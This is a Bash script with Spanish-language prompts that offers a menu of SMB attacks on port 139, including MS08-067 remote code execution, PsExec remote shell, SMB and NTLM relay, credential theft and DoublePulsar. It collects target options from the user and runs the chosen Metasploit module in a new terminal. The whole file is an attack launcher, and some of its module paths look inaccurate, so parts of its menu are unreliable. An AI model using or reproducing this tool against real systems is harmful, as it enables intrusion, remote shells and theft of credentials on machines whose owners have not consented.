#!/bin/bash

clear
PORT=139
echo "Puerto $PORT - SMB Exploits"
echo "Selecciona un exploit para ejecutar:"
echo

echo "[1] MS08-067 NetAPI Local RCE                ★★★★"
echo "[2] PsExec Remote Shell                      ★★★★★"
echo "[3] SMB Relay                                ★★★"
echo "[4] SMB RelayX                               ★★"
echo "[5] SMB SSP Relay                            ★★★"
echo "[6] SMB Payload Dropper                      ★★★★"
echo "[7] SMBv2 Relay                              ★★"
echo "[8] LSA Information Leak                     ★★"
echo "[9] SMB NTLM Credential Theft                ★★★"
echo "[10] SMB DoublePulsar Relay                   ★★★★"
echo "[11] Salir"

read -p "Opción: " opcion
if [[ $opcion -lt 1 || $opcion -gt 11 ]]; then
  echo "Opción inválida"
  exit 1
fi

if [[ $opcion -eq 11 ]]; then
  exit 0
fi

# Obtener exploit seleccionado
declare -a paths=(
"windows/smb/ms08_067_netapi"
"windows/smb/psexec"
"windows/smb/smb_relay"
"windows/smb/smb_relayx"
"windows/smb/smb_relay_ssp"
"windows/smb/smb_delivery"
"windows/smb/smb2_relay"
"windows/smb/smb_lsa"
"windows/smb/smb_ntlm_credential_theft"
"windows/smb/smb_relay_doublepulsar"
)


SELECTED_EXPLOIT=${paths[$((opcion-1))]}

# Obtener opciones
TEMPFILE=$(mktemp)
msfconsole -q -x "use $SELECTED_EXPLOIT; show options; exit" > "$TEMPFILE"

echo "Mostrando opciones del exploit $SELECTED_EXPLOIT"
REQUIRED_VARS=()
OPTIONAL_VARS=()

while read -r line; do
  if [[ $line =~ ^[[:space:]]*([A-Z_]+)[[:space:]]+.*(required)[[:space:]]+.*$ ]]; then
    REQUIRED_VARS+=("${BASH_REMATCH[1]}")
  elif [[ $line =~ ^[[:space:]]*([A-Z_]+)[[:space:]]+.*(no)[[:space:]]+.*$ ]]; then
    OPTIONAL_VARS+=("${BASH_REMATCH[1]}")
  fi
done < "$TEMPFILE"
rm "$TEMPFILE"

declare -A VAR_VALUES

echo
echo "Opciones requeridas:"
for var in "${REQUIRED_VARS[@]}"; do
  read -p "Ingresá valor para $var: " valor
  VAR_VALUES["$var"]="$valor"
done

echo
read -p "¿Deseás configurar opciones opcionales? (s/n): " opc
if [[ "$opc" =~ ^[sS]$ ]]; then
  for var in "${OPTIONAL_VARS[@]}"; do
    read -p "Ingresá valor para $var (enter para omitir): " valor
    [[ -n "$valor" ]] && VAR_VALUES["$var"]="$valor"
  done
fi

# Armar línea de ejecución
SET_COMMANDS=""
for key in "${!VAR_VALUES[@]}"; do
  SET_COMMANDS+="set $key ${VAR_VALUES[$key]}; "
done

xterm -hold -e "msfconsole -q -x 'use $SELECTED_EXPLOIT; $SET_COMMANDS show options; run'" &
